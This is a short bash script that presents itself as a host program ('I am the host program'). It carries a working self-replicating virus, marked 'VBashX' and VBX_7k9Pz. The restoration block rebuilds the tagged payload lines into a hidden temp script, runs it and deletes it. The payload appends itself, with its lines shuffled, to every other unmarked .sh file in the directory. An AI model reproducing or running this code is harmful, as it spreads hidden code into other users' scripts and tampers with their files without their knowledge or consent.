#!/bin/bash
echo "I am the host program"
# --- VBashX Restoration --- VBX_7k9Pz
REST_SIZE=11
LI=16
VIRUS_SIZE=$(($REST_SIZE + $LI))
TMP=".vbx_tmp.sh"
echo "#!/bin/bash" > $TMP
echo "SRC=\"$0\"" >> $TMP
nb=1; while [ $nb -le $LI ]; do
grep "#@${nb}#" "$0" >> $TMP
nb=$(($nb + 1)); done
chmod +x $TMP && ./$TMP; rm -f $TMP; exit 0
MARKER="VBX_7k9Pz" #@1#
for f in *.sh; do #@2#
if [ "$(basename "$f")" != "$(basename "$SRC")" ]; then #@3#
if [ -z "$(grep "$MARKER" "$f")" ]; then #@4#
REST_S=11; LI_S=16; VS=$(($REST_S + $LI_S)) #@5#
tail -n $VS "$SRC" | head -n $REST_S >> "$f" #@6#
r=$(( ($RANDOM % 16) + 1 )) #@7#
n=1 #@8#
while [ $n -le $LI_S ]; do #@9#
grep "#@${r}#" "$SRC" >> "$f" #@10#
r=$(( ($r * 3) % 17 )) #@11#
n=$(($n + 1)) #@12#
done #@13#
fi #@14#
fi #@15#
done #@16#
